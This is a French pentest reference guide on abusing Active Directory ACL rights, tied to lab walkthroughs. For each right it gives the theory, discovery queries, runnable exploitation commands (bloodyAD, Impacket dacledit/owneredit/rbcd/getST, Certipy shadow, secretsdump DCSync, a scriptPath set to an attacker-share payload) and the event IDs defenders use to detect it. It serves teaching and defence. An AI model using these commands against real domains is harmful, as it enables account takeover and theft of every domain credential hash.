@@ -1,0 +1,625 @@
+---
+title: "DACLs : Comprendre et Exploiter les ACL Active Directory"
+date: "08-08-2026"
+tags:
+  [
+    "Active Directory",
+    "ACL",
+    "GenericAll",
+    "GenericWrite",
+    "WriteDacl",
+    "WriteOwner",
+    "ForceChangePassword",
+    "RBCD",
+    "Shadow Credentials",
+    "DCSync",
+    "BloodHound",
+    "PowerView",
+    "bloodyAD",
+  ]
+category: "walkthroughs"
+lang: "fr"
+description: "Guide de référence complet sur les ACL Active Directory exploitables en pentest : théorie, découverte via BloodHound/PowerView/CLI native, exploitation pas à pas avec bloodyAD et Impacket, impact réel et détection côté défense, pour chaque droit majeur (GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, AddMember, RBCD, Shadow Credentials, DCSync et plus)."
+---
+
+## Introduction
+
+Dans un domaine Active Directory, chaque objet (utilisateur, groupe, ordinateur, unité d'organisation) possède une DACL (Discretionary Access Control List) qui définit précisément qui peut faire quoi sur lui. Ces droits sont censés refléter des besoins métiers légitimes : un service Helpdesk qui doit pouvoir réinitialiser des mots de passe, un groupe IT qui gère des postes de travail, une délégation d'administration partielle.
+
+Le problème est que ces délégations s'accumulent avec le temps, rarement auditées, souvent trop larges par rapport au besoin réel. Un attaquant qui compromet n'importe quel compte du domaine, même le plus anodin, peut suivre ces chaînes de droits comme un chemin balisé jusqu'à l'Administrateur du domaine. C'est exactement ce qu'on a déjà exploité dans les labs Solarix, Welcome et Arasaka : ce document sert de référence complète sur le sujet, sans avoir à réexpliquer la mécanique à chaque nouveau writeup.
+
+### Outils utilisés dans ce document
+
+| Outil                      | Rôle                                                                                       |
+| -------------------------- | ------------------------------------------------------------------------------------------ |
+| **BloodHound**             | Cartographie visuelle des relations et chemins d'attaque via ACL                           |
+| **PowerView**              | Énumération native PowerShell des ACL (`Get-DomainObjectAcl`)                              |
+| **bloodyAD**               | Exploitation des droits (ajout de membre, reset de mot de passe, modification d'attributs) |
+| **Impacket**               | Suite d'outils Python pour l'exploitation réseau (`secretsdump`, `owneredit`, `dacledit`)  |
+| **dsacls / PowerShell AD** | Énumération native depuis un contexte Windows authentifié                                  |
+
+### Tableau Récapitulatif
+
+| Droit                                   | Ce qu'il permet                                              | Outil principal              |
+| --------------------------------------- | ------------------------------------------------------------ | ---------------------------- |
+| `AddMember` / `AddSelf`                 | S'ajouter ou ajouter un objet à un groupe                    | bloodyAD                     |
+| `ForceChangePassword`                   | Réinitialiser le mot de passe sans le connaître              | bloodyAD                     |
+| `AllExtendedRights`                     | Hérite de tous les droits étendus (dont ForceChangePassword) | bloodyAD                     |
+| `ReadLAPSPassword` / `ReadGMSAPassword` | Lire un mot de passe géré automatiquement (LAPS, gMSA)       | bloodyAD, Impacket           |
+| `GenericAll`                            | Contrôle total de l'objet                                    | bloodyAD                     |
+| `GenericWrite`                          | Écriture sur la plupart des attributs de l'objet             | bloodyAD, targetedKerberoast |
+| `WriteDacl`                             | Modifier la DACL de l'objet (s'auto-accorder des droits)     | Impacket dacledit, bloodyAD  |
+| `WriteOwner`                            | Devenir propriétaire de l'objet                              | bloodyAD, Impacket owneredit |
+| `WriteProperty` (SPN)                   | Injecter un SPN pour un Targeted Kerberoasting               | targetedKerberoast           |
+| `WriteProperty` (ScriptPath)            | Exécution de code au prochain logon de la cible              | bloodyAD                     |
+| `WriteProperty` (RBCD)                  | Déléguer l'authentification en son propre nom                | Impacket, Rubeus             |
+| `WriteProperty` (Shadow Credentials)    | Ajouter une clé publique pour s'authentifier via PKINIT      | Certipy, Whisker             |
+| `Replicating Directory Changes [All]`   | Répliquer les hashs de tous les comptes du domaine (DCSync)  | Impacket secretsdump         |
+
+---
+
+## Famille 1 : Contrôle de Groupe
+
+### AddMember / AddSelf
+
+Référence : [BloodHound : AddMember](https://bloodhound.specterops.io/resources/edges/add-member) / [BloodHound : AddSelf](https://bloodhound.specterops.io/resources/edges/add-self)
+
+**Théorie et mécanisme**
+
+Ce droit s'applique directement sur un objet **groupe** et autorise son détenteur à modifier l'attribut `member` de ce groupe, c'est-à-dire à y ajouter (ou parfois retirer) des membres. `AddSelf` est une variante plus restrictive : elle n'autorise que l'ajout de soi-même, pas d'un tiers. Ce droit existe légitimement pour permettre une gestion déléguée des groupes (par exemple, un manager qui gère la composition de l'équipe de son département) sans avoir besoin de droits d'administration du domaine.
+
+L'impact dépend entièrement de **ce que le groupe accorde**. S'ajouter à un groupe qui n'a aucun privilège particulier est sans intérêt. S'ajouter à un groupe qui est lui-même membre imbriqué d'un groupe à privilèges (Remote Management Users, Domain Admins via imbrication, ou un groupe qui possède d'autres ACL intéressantes plus loin dans la chaîne, comme vu dans Solarix) devient un maillon d'escalade.
+
+**Découverte**
+
+Via Cypher dans l'interface BloodHound :
+
+```cypher
+MATCH p=(u:User)-[:AddMember|AddSelf]->(g:Group)
+RETURN p
+```
+
+Via PowerView :
+
+```powershell
+Get-DomainObjectAcl -Identity "SLX-IDENTITY-AUDITORS" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' -and $_.ObjectAceType -match 'Member' }
+```
+
+Via dsacls natif :
+
+```cmd
+dsacls "CN=SLX-IDENTITY-AUDITORS,CN=Users,DC=solarix,DC=energy"
+```
+
+**Exploitation**
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  add groupMember "GroupeCible" attacker
+```
+
+**Impact**
+
+L'attaquant devient membre du groupe visé, héritant immédiatement de tous les droits attachés à ce groupe (accès à des partages, appartenance à Remote Management Users, ou nouvelles ACL exploitables sur d'autres objets, comme démontré dans la chaîne Solarix où l'ajout à `SLX-IDENTITY-AUDITORS` débloquait un `WriteOwner` sur un groupe suivant).
+
+**Détection**
+
+Event ID **4728** (ajout à un groupe global de sécurité), **4732** (groupe local), **4756** (groupe universel). Un ajout de membre à un groupe sensible en dehors des heures ouvrées ou par un compte qui n'a jamais effectué cette opération auparavant est un signal fort à surveiller.
+
+---
+
+## Famille 2 : Réinitialisation de Credentials
+
+### AllExtendedRights
+
+Référence : [Hackingarticles.in : AllExtendedRights Active Directory Abuse](https://www.hackingarticles.in/allextendedrights-active-directory-abuse/)
+
+**Théorie et mécanisme**
+
+Les ACL de type "extended right" ne se limitent pas aux droits classiques de lecture ou écriture d'attribut ; elles définissent des opérations spécialisées sur l'objet. Sur un compte utilisateur, les exemples les plus parlants sont :
+
+- `User-Force-Change-Password` : réinitialiser le mot de passe sans connaître l'ancien.
+- `User-Change-Password` : changer le mot de passe en fournissant l'ancien.
+- `SendAs` / `ReceiveAs` : délégations de messagerie Exchange sur des boîtes aux lettres (hors périmètre des comptes utilisateurs AD classiques, mais conceptuellement de la même famille d'extended rights).
+
+`AllExtendedRights` n'est pas un droit individuel : c'est un **conteneur qui hérite de tous les droits étendus disponibles** sur l'objet. Sur un objet utilisateur, cela inclut généralement `ForceChangePassword` et parfois d'autres opérations de mot de passe. C'est pour cela que les outils d'attaque traitent souvent `AllExtendedRights` comme un équivalent de `ForceChangePassword` lorsque l'objet est un compte utilisateur.
+
+**Découverte et exploitation**
+
+Identiques à `ForceChangePassword` ci-dessous : BloodHound et PowerView remontent `AllExtendedRights` comme une relation distincte, mais l'exploitation via bloodyAD reste la même commande `set password`.
+
+**Impact et détection**
+
+Identiques à `ForceChangePassword`.
+
+### ForceChangePassword
+
+Référence : [ired.team : Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+
+**Théorie et mécanisme**
+
+C'est un droit étendu (extended right) qui autorise son détenteur à réinitialiser le mot de passe d'un compte **sans connaître l'ancien**. Contrairement à un changement de mot de passe classique qui exige l'ancien mot de passe, cette opération correspond à ce qu'un administrateur ferait via la console "Réinitialiser le mot de passe" dans les utilisateurs et ordinateurs Active Directory. Ce droit est très fréquemment délégué à des groupes Helpdesk ou support technique.
+
+> [!WARNING]
+> Réinitialiser le mot de passe écrase l'ancien : le titulaire légitime du compte perd instantanément l'accès et le remarquera à sa prochaine tentative de connexion. Dans un engagement réel, privilégier `ReadLAPSPassword`, `ReadGMSAPassword` ou les Shadow Credentials quand ils sont disponibles sur la même cible, ces vecteurs ne génèrent aucune interruption de service observable par l'utilisateur.
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:ForceChangePassword]->(t:User)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'ExtendedRight' -and $_.ObjectAceType -match 'User-Force-Change-Password' }
+```
+
+**Exploitation**
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  set password cible 'NouveauMotDePasse123!'
+```
+
+**Impact**
+
+Prise de contrôle directe et immédiate du compte cible, sans passer par un cassage de hash. C'est la méthode la plus rapide de toute cette famille de droits, à condition d'accepter que le mot de passe légitime du titulaire soit écrasé (opération bruyante, détectable par l'utilisateur lui-même qui perd l'accès à son compte).
+
+**Détection**
+
+Event ID **4724** (tentative de réinitialisation de mot de passe) et **4738** (compte utilisateur modifié). Une réinitialisation effectuée par un compte autre qu'un administrateur habituel du Helpdesk, ou en dehors d'un ticket de support connu, doit être investiguée.
+
+### ReadLAPSPassword / ReadGMSAPassword
+
+Référence : [Microsoft Learn : Windows LAPS overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) / [GitHub : micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+
+**Théorie et mécanisme**
+
+LAPS (Local Administrator Password Solution) gère automatiquement et fait tourner le mot de passe de l'administrateur local de chaque machine du domaine, stocké dans l'attribut `ms-Mcs-AdmPwd` (LAPS legacy) ou `msLAPS-Password` (LAPS Windows moderne) de l'objet ordinateur correspondant dans l'annuaire. Un compte disposant du droit de lecture sur cet attribut peut lire ce mot de passe en clair directement via LDAP.
+
+> [!TIP]
+> Ces deux droits sont parmi les plus discrets de ce document : il s'agit d'une simple lecture LDAP, sans aucune écriture ni modification sur l'objet visé. Aucun mot de passe n'est changé, aucun ticket n'est forgé. À privilégier systématiquement quand ils sont disponibles sur la cible, avant d'envisager un `ForceChangePassword` plus bruyant.
+
+De la même manière, un **gMSA** (Group Managed Service Account) a son mot de passe généré et renouvelé automatiquement par les contrôleurs de domaine, stocké chiffré dans l'attribut `msDS-ManagedPassword`, lisible uniquement par les principaux explicitement autorisés (`msDS-GroupMSAMembership`).
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:ReadLAPSPassword|ReadGMSAPassword]->(c)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "PC01$" -ResolveGUIDs | \
+  Where-Object { $_.ObjectAceType -match 'ms-Mcs-AdmPwd' }
+```
+
+**Exploitation**
+
+Pour LAPS :
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  get object "PC01$" --attr ms-Mcs-AdmPwd
+```
+
+Pour un gMSA, avec Impacket :
+
+```bash
+python3 gMSADumper.py -u attacker -p 'Password123' -d domain.local
+```
+
+**Impact**
+
+Accès direct au mot de passe administrateur local en clair d'une machine (LAPS) ou au mot de passe actuel d'un compte de service géré (gMSA), sans avoir besoin de le casser hors ligne. Pour LAPS, l'impact reste local à la machine visée sauf si cet administrateur local partage un mot de passe avec d'autres postes (mauvaise pratique que LAPS est justement censé empêcher).
+
+**Détection**
+
+Event ID **4662** (opération effectuée sur un objet) avec le GUID de propriété correspondant à `ms-Mcs-AdmPwd` ou `msDS-ManagedPassword` dans les détails de l'événement, à condition que l'audit d'accès en lecture soit explicitement activé sur ces attributs (non activé par défaut).
+
+---
+
+## Famille 3 : Contrôle Total d'Objet
+
+### GenericAll
+
+Référence : [Medium (Shebin John) : Abusing Active Directory ACLs for Privilege Escalation](https://medium.com/@shebinjohn53/abusing-active-directory-acls-for-privilege-escalation-a-red-team-guide-90ac1692b73f)
+
+**Théorie et mécanisme**
+
+`GenericAll` est le droit le plus puissant qu'on puisse détenir sur un objet Active Directory : il équivaut à un contrôle total, cumulant de facto tous les droits listés dans ce document sur cet objet précis (changement de mot de passe, modification de tous les attributs, modification de la DACL, changement de propriétaire). Sur un objet utilisateur, il permet un reset direct du mot de passe. Sur un objet groupe, il permet d'en modifier les membres. Sur un objet ordinateur, il permet notamment d'écrire l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` pour de la RBCD.
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:GenericAll]->(t)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll' }
+```
+
+**Exploitation**
+
+Sur un utilisateur (reset direct du mot de passe) :
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  set password cible 'NouveauMotDePasse123!'
+```
+
+Sur un groupe (ajout de membre) :
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  add groupMember "GroupeCible" attacker
+```
+
+**Impact**
+
+Compromission complète et immédiate de l'objet visé, quel que soit son type. C'est le droit le plus critique à repérer dans une cartographie BloodHound.
+
+**Détection**
+
+Identique à `ForceChangePassword` (4724/4738) si utilisé pour un reset de mot de passe, ou 4728/4732/4756 si utilisé pour une modification de groupe. La détection dépend donc de l'action finale réalisée avec ce droit, pas du droit en lui-même.
+
+### GenericWrite
+
+Référence : [ired.team : Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#forcechangepassword)
+
+**Théorie et mécanisme**
+
+`GenericWrite` autorise l'écriture sur la quasi-totalité des attributs non protégés de l'objet, sans toutefois accorder le contrôle total (`GenericAll`) ni le droit de modifier la DACL ou le propriétaire. Concrètement, ce droit permet de modifier des attributs comme `scriptPath` (chemin du script exécuté à la connexion), `servicePrincipalName` (base du Targeted Kerberoasting, déjà exploité dans le lab Arasaka) ou `msDS-AllowedToActOnBehalfOfOtherIdentity` sur un objet ordinateur (RBCD).
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:GenericWrite]->(t)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericWrite' }
+```
+
+**Exploitation**
+
+L'exploitation concrète dépend de l'attribut ciblé, détaillée dans la Famille 4 de ce document (Targeted Kerberoasting, ScriptPath, RBCD).
+
+**Impact**
+
+Variable selon l'attribut exploité, mais toujours suffisant pour amorcer une escalade : injection de SPN pour cassage offline, exécution de code au prochain logon, ou prise de contrôle via délégation.
+
+**Détection**
+
+Event ID **5136** (objet du service d'annuaire modifié), qui journalise précisément quel attribut a été modifié, par qui, et l'ancienne/nouvelle valeur, à condition que l'audit des modifications d'objets AD soit activé sur l'OU concernée.
+
+### WriteDacl
+
+Référence : [The Hacker Recipes : DACL abuse](https://www.thehacker.recipes/ad/movement/dacl/)
+
+**Théorie et mécanisme**
+
+`WriteDacl` autorise son détenteur à **modifier la DACL de l'objet lui-même**, c'est-à-dire à s'accorder n'importe quel autre droit sur cet objet, y compris `GenericAll`. C'est un droit à part : il n'accorde aucune capacité directe sur l'objet, mais permet de s'octroyer n'importe quelle capacité en une étape supplémentaire. C'est exactement ce qui a été exploité dans le lab Solarix : après avoir obtenu la propriété d'un groupe via `WriteOwner`, la propriété confère implicitement le droit de modifier la DACL, utilisé ensuite pour s'auto-accorder `GenericAll`.
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:WriteDacl]->(t)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'WriteDacl' }
+```
+
+**Exploitation**
+
+Avec bloodyAD, en s'accordant directement GenericAll :
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  add genericAll "GroupeCible" attacker
+```
+
+Avec Impacket dacledit, pour un contrôle plus granulaire de l'ACE ajoutée :
+
+```bash
+python3 dacledit.py -action write -rights FullControl \
+  -principal attacker -target "GroupeCible" \
+  "domain.local"/"attacker":"Password123"
+```
+
+> [!TIP]
+> `dacledit.py` accepte un flag `-remove` pour retirer précisément l'ACE ajoutée une fois l'exploitation terminée, contrairement à `bloodyad add genericAll` qui laisse le droit en place de façon permanente. En engagement réel, privilégier dacledit pour pouvoir nettoyer proprement après passage.
+
+**Impact**
+
+S'auto-accorder n'importe quel droit sur l'objet visé, généralement `GenericAll`, ce qui ramène ensuite à l'exploitation de ce dernier.
+
+**Détection**
+
+Event ID **4670** (les autorisations sur un objet ont été modifiées), qui journalise explicitement le changement de DACL. C'est un des événements les plus fiables pour détecter ce type d'abus, à condition qu'il soit surveillé activement, un changement de DACL en dehors d'une opération d'administration planifiée est presque toujours suspect.
+
+### WriteOwner
+
+Référence : [HackTricks : Abusing Active Directory ACLs/ACEs](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)
+
+**Théorie et mécanisme**
+
+`WriteOwner` autorise à changer le propriétaire (owner) d'un objet. Le mécanisme clé à comprendre : **être propriétaire d'un objet Active Directory confère implicitement le droit de modifier sa DACL**, même sans ACE `WriteDacl` explicite. C'est une règle intrinsèque du modèle de sécurité Windows, pas une permission qu'on peut retirer facilement. C'est la première étape de la chaîne d'ACL exploitée dans Solarix : `alice` devient propriétaire de `SLX-TURBINE-TECHS`, ce qui lui permet ensuite de s'auto-accorder `GenericAll` sur ce même groupe.
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:WriteOwner]->(t)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ActiveDirectoryRights -match 'WriteOwner' }
+```
+
+**Exploitation**
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  set owner "GroupeCible" attacker
+```
+
+Avec Impacket owneredit :
+
+```bash
+python3 owneredit.py -action write -new-owner attacker \
+  -target "GroupeCible" "domain.local"/"attacker":"Password123"
+```
+
+Une fois propriétaire, l'étape suivante consiste systématiquement à s'octroyer `GenericAll` via le droit `WriteDacl` implicite (voir section précédente).
+
+**Impact**
+
+Point d'entrée vers un contrôle total de l'objet en deux étapes (prise de propriété, puis auto-attribution de GenericAll), même en l'absence de tout autre droit explicite sur cet objet.
+
+**Détection**
+
+Event ID **4670** également (le changement de propriétaire est journalisé comme une modification des autorisations sur l'objet).
+
+---
+
+## Famille 4 : Écriture Ciblée et Délégation
+
+### WriteProperty sur servicePrincipalName : Targeted Kerberoasting
+
+Référence : [Trustmarque : What is Targeted Kerberoasting](https://trustmarque.com/resources/news/what-is-targeted-keberoasting) / [GitHub : ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+
+**Théorie et mécanisme**
+
+Déjà détaillé en profondeur dans le lab Arasaka : un droit d'écriture sur l'objet cible permet d'injecter un SPN factice dans son attribut `servicePrincipalName`, le rendant Kerberoastable alors qu'il ne l'était pas nativement, pour ensuite demander et casser son TGS hors ligne.
+
+> [!TIP]
+> En conditions réelles, retirer le SPN factice injecté une fois le TGS récupéré (`targetedKerberoast` le fait automatiquement en fin d'exécution). Laisser un SPN inconnu sur un compte est une trace facilement repérable lors d'un audit AD ultérieur.
+
+**Découverte et exploitation**
+
+```bash
+targetedKerberoast -v -d domain.local -u attacker -p 'Password123'
+```
+
+L'outil identifie automatiquement les comptes accessibles en écriture (`GenericWrite` ou `WriteProperty` ciblé sur le SPN) et exécute l'injection puis la demande de TGS en une seule commande.
+
+**Impact et détection**
+
+Voir lab Arasaka pour le détail complet.
+
+### WriteProperty sur ScriptPath
+
+**Théorie et mécanisme**
+
+L'attribut `scriptPath` d'un objet utilisateur définit un script (généralement un `.bat` ou `.vbs`) exécuté automatiquement à chaque ouverture de session interactive de cet utilisateur, depuis le partage `NETLOGON`. Un droit d'écriture sur cet attribut permet de pointer vers un script contrôlé par l'attaquant. L'impact réel dépend entièrement du fait que la cible se connecte physiquement ou via RDP, ce qui ne se produit pas systématiquement, contrairement aux autres vecteurs de cette liste qui sont immédiats.
+
+**Découverte**
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ObjectAceType -match 'Script-Path' }
+```
+
+**Exploitation**
+
+```bash
+bloodyad -d domain.local -u attacker -p 'Password123' --host 10.10.10.10 \
+  set object cible scriptPath -v '\\attacker-share\payload.bat'
+```
+
+> [!WARNING]
+> Ce vecteur est conditionnel et différé : il ne se déclenche qu'à la prochaine connexion interactive de la cible, qui peut ne jamais survenir pendant la fenêtre de l'engagement. Ne l'utiliser qu'en dernier recours, si aucune voie plus directe (GenericAll, ForceChangePassword) n'est disponible sur cette même cible.
+
+**Impact**
+
+Exécution de code arbitraire dans le contexte de la cible, au moment de sa prochaine connexion interactive.
+
+**Détection**
+
+Event ID **5136** (modification d'objet AD, attribut `scriptPath`), et côté endpoint, l'exécution du script lui-même doit remonter dans les logs Sysmon (Event ID 1, création de processus) ou l'EDR du poste.
+
+### WriteProperty sur msDS-AllowedToActOnBehalfOfOtherIdentity : RBCD
+
+Référence : [The Hacker Recipes : Resource-Based Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) / [Shenanigans Labs : Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+
+**Théorie et mécanisme**
+
+La délégation contrainte basée sur les ressources (Resource-Based Constrained Delegation) permet à un objet ordinateur de désigner lui-même, via l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, quels comptes sont autorisés à s'authentifier en son nom auprès d'un service tiers via S4U2Self/S4U2Proxy. Un droit d'écriture sur cet attribut permet à l'attaquant de s'y désigner lui-même (ou de désigner un compte machine qu'il contrôle), puis d'utiliser le mécanisme de délégation Kerberos pour obtenir un ticket de service au nom de n'importe quel utilisateur du domaine, y compris un administrateur, sur la machine visée.
+
+**Découverte**
+
+```powershell
+Get-DomainObjectAcl -Identity "PC01$" -ResolveGUIDs | \
+  Where-Object { $_.ObjectAceType -match 'msDS-AllowedToActOnBehalfOfOtherIdentity' }
+```
+
+**Exploitation**
+
+> [!WARNING]
+> Cette technique nécessite de contrôler un compte porteur d'un SPN, généralement un compte machine. Par défaut, tout utilisateur du domaine peut créer jusqu'à 10 comptes machine via l'attribut `ms-DS-MachineAccountQuota` (`MachineAccountQuota`), ce qui permet d'en créer un dédié à l'attaque si aucun compte machine contrôlé n'est déjà disponible.
+
+Étape 1, création ou utilisation d'un compte machine contrôlé par l'attaquant, puis écriture de l'attribut sur la cible :
+
+```bash
+python3 rbcd.py -action write -delegate-to "PC01$" \
+  -delegate-from "ATTACKERPC$" "domain.local"/"attacker":"Password123"
+```
+
+Étape 2, obtention d'un ticket de service via S4U2Self puis S4U2Proxy avec Impacket getST, au nom d'un administrateur :
+
+```bash
+python3 getST.py -spn "cifs/PC01.domain.local" \
+  -impersonate Administrator \
+  "domain.local"/"ATTACKERPC$":'Password123'
+```
+
+**Impact**
+
+Obtention d'un ticket de service valide au nom d'un compte administrateur sur la machine ciblée, équivalent à une compromission complète de cette machine (accès CIFS, WMI, WinRM selon le SPN demandé).
+
+**Détection**
+
+Event ID **5136** sur la modification de l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, et côté Kerberos, la présence du champ S4U dans les tickets délivrés (visible via les logs d'audit Kerberos avancés, Event ID 4769 avec les flags de délégation).
+
+### WriteProperty sur msDS-KeyCredentialLink : Shadow Credentials
+
+Référence : [ired.team : Shadow Credentials](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) / [GitHub : eladshamir/Whisker](https://github.com/eladshamir/Whisker)
+
+**Théorie et mécanisme**
+
+L'attribut `msDS-KeyCredentialLink` stocke des informations de clé publique utilisées pour l'authentification Windows Hello for Business et, plus largement, pour PKINIT (authentification Kerberos par certificat). Un droit d'écriture sur cet attribut permet à l'attaquant d'y ajouter sa propre paire de clés (générée localement), sans jamais toucher au mot de passe de la cible. Le KDC accepte ensuite une authentification PKINIT avec la clé privée correspondante comme preuve d'identité valide pour ce compte, exactement comme s'il s'agissait d'un certificat ADCS légitime, débouchant sur le hash NTLM du compte via le même mécanisme U2U qu'en ESC1.
+
+**Découverte**
+
+```powershell
+Get-DomainObjectAcl -Identity "cible" -ResolveGUIDs | \
+  Where-Object { $_.ObjectAceType -match 'msDS-KeyCredentialLink' }
+```
+
+**Exploitation**
+
+Avec Certipy (relais du même sous-système que les certificats) :
+
+```bash
+certipy-ad shadow auto -u attacker -p 'Password123' \
+  -account cible -dc-ip 10.10.10.10
+```
+
+L'outil génère la paire de clés, l'injecte dans l'attribut de la cible, effectue l'authentification PKINIT, puis récupère automatiquement le hash NTLM du compte.
+
+> [!TIP]
+> Cette technique nécessite qu'au moins un contrôleur de domaine tourne sous Windows Server 2016 ou supérieur avec PKINIT supporté (quasiment toujours le cas en environnement moderne). C'est actuellement le vecteur le plus discret de tout ce document : aucune écriture sur le mot de passe, aucune trace côté utilisateur final.
+
+**Impact**
+
+Compromission complète du compte cible (récupération du hash NTLM) sans jamais modifier son mot de passe, ce qui rend cette technique nettement plus discrète que `ForceChangePassword` : le titulaire légitime du compte ne perd jamais l'accès et ne remarque rien.
+
+**Détection**
+
+Event ID **5136** sur la modification de `msDS-KeyCredentialLink` (attribut rarement modifié en usage normal en dehors d'un déploiement Windows Hello for Business), et Event ID **4768/4769** montrant une authentification PKINIT pour un compte qui n'a historiquement jamais utilisé ce mécanisme.
+
+---
+
+## Famille 5 : Réplication
+
+### DCSync
+
+Référence : [Semperis : What is a DCSync attack?](https://www.semperis.com/blog/dcsync-attack/)
+
+**Théorie et mécanisme**
+
+Les contrôleurs de domaine se répliquent mutuellement l'intégralité de l'annuaire, hashs de mots de passe inclus, via le protocole DRSUAPI. Un compte disposant des droits étendus **`Replicating Directory Changes`** et **`Replicating Directory Changes All`** peut se faire passer pour un DC et demander cette réplication pour n'importe quel objet, sans jamais avoir besoin d'un accès interactif sur un contrôleur de domaine. Ces droits sont normalement réservés aux contrôleurs de domaine eux-mêmes et aux membres de groupes comme Domain Admins ou Enterprise Admins, mais se retrouvent parfois délégués par erreur à des comptes de service (comme observé dans le lab VulnNet: Roasted).
+
+**Découverte**
+
+```cypher
+MATCH p=(u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
+RETURN p
+```
+
+```powershell
+Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | \
+  Where-Object { $_.ObjectAceType -match 'DS-Replication-Get-Changes' }
+```
+
+**Exploitation**
+
+```bash
+impacket-secretsdump -just-dc 'domain.local/attacker:Password123@10.10.10.10' \
+  -dc-ip 10.10.10.10
+```
+
+> [!WARNING]
+> C'est le droit le plus critique de tout ce document : sa présence sur un compte hors DC signale presque toujours une erreur de délégation majeure. En engagement réel, ce constat doit être remonté au client immédiatement, indépendamment de la suite du test.
+
+**Impact**
+
+Récupération de l'intégralité des hashs NT de tous les comptes du domaine en une seule opération réseau, sans jamais toucher au fichier `NTDS.dit` sur disque. C'est la compromission la plus complète et la plus silencieuse (pas d'interaction locale sur le DC) de tout ce document.
+
+**Détection**
+
+Event ID **4662** (opération effectuée sur un objet) avec les GUIDs spécifiques `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (`DS-Replication-Get-Changes`) et `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (`DS-Replication-Get-Changes-All`) dans les détails de l'événement. Toute occurrence de ces GUIDs associée à un compte qui n'est ni un contrôleur de domaine ni un compte de réplication connu (Azure AD Connect, solution de sauvegarde) doit déclencher une alerte immédiate.
+
+---
+
+## Chaînage des ACL
+
+Les droits présentés isolément dans ce document sont rarement suffisants seuls pour atteindre une compromission complète. Leur véritable danger réside dans leur **enchaînement** : chaque droit obtenu débloque potentiellement un nouveau droit sur un objet suivant, jusqu'à atteindre une cible à forte valeur. C'est exactement le schéma observé dans les labs Solarix et Arasaka.
+
+```
+Compte initial compromis
+        │
+        │  AddMember / AddSelf
+        ▼
+Groupe intermédiaire A
+        │
+        │  WriteOwner
+        ▼
+Groupe intermédiaire B (attaquant devient propriétaire)
+        │
+        │  WriteDacl implicite (via la propriété)
+        ▼
+Attaquant s'auto-accorde GenericAll sur le Groupe B
+        │
+        │  ForceChangePassword (hérité via GenericAll)
+        ▼
+Compte cible final (reset de mot de passe, ou GenericWrite → Targeted Kerberoasting)
+        │
+        ▼
+Accès direct, ou nouveau pivot vers un objet lié aux certificats (ADCS/ESC)
+```
+
+**La méthodologie pratique reste toujours la même** : cartographier l'intégralité du domaine avec BloodHound depuis le tout premier compte compromis, identifier le chemin le plus court vers un groupe à privilèges (Shortest Path to Domain Admins / High Value Targets), puis exécuter chaque maillon de la chaîne un par un avec bloodyAD ou les outils Impacket adaptés, en validant les credentials à chaque étape avant de passer à la suivante.
+
+> [!TIP]
+> Toujours relancer une collecte BloodHound après chaque compromission de compte intermédiaire. De nouveaux chemins invisibles depuis le compte initial apparaissent fréquemment une fois un nouveau principal ajouté à l'analyse, exactement comme observé dans Arasaka où le chemin vers Soulkiller.svc ne devenait visible qu'après avoir intégré les droits de Yorinobu.
+
+---
+
+## Synthèse Défensive
+
+| Principe                                   | Application concrète                                                                                                       |
+| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
+| Moindre privilège                          | Toute délégation ACL doit correspondre à un besoin métier documenté et réévalué périodiquement                             |
